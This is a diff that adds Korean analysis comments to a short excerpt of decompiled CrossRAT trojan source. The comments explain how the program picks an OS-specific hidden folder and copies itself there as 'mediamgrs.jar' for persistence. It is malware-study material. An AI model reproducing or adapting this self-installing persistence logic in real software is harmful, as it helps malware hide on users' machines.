@@ -17,22 +17,25 @@ public class client {
       a.a var15 = a.c.b();
       String var1 = "java.io.tmpdir";
       var1 = System.getProperty("java.io.tmpdir");
+      // var2: crossRAT이 실행된 위치
       String var2 = URLDecoder.decode(client.class.getProtectionDomain().getCodeSource().getLocation().getPath(), "UTF-8");
       File var20 = new File(var2);
       k.K = "";
       String var16;
       if (var15.a() == a.c.a) {
-         k.K = var1 + "\\";
+         k.K = var1 + "\\"; // 윈도우인 경우: java.io.tmpdir 즉 임시 디렉토리의 경로를 가져온다.
       } else if (var15.a() == a.c.b) {
          var16 = System.getProperty("user.home");
-         k.K = var16 + "/Library/";
+         k.K = var16 + "/Library/"; // Mac인 경우: home directory의 라이브러리 폴더의 경로를 가져온다.
       } else {
-         k.K = "/usr/var/";
+         k.K = "/usr/var/"; // Linux인 경우: /usr/var
       }
 
-      File var17 = new File(k.K + "mediamgrs.jar");
+      File var17 = new File(k.K + "mediamgrs.jar"); // OS별로 다른 적절한 폴더에 이 파일을 가리키는 File 객체
 
       try {
+         // var20: 실행된 위치, var17: 위에서 정한 적절한 폴더
+         // 아마도 var20을 var17로 복사하는 함수인 듯 하다.
          org.a.a.a.b.a(var20, var17);
       } catch (Exception var11) {
          var11.printStackTrace();
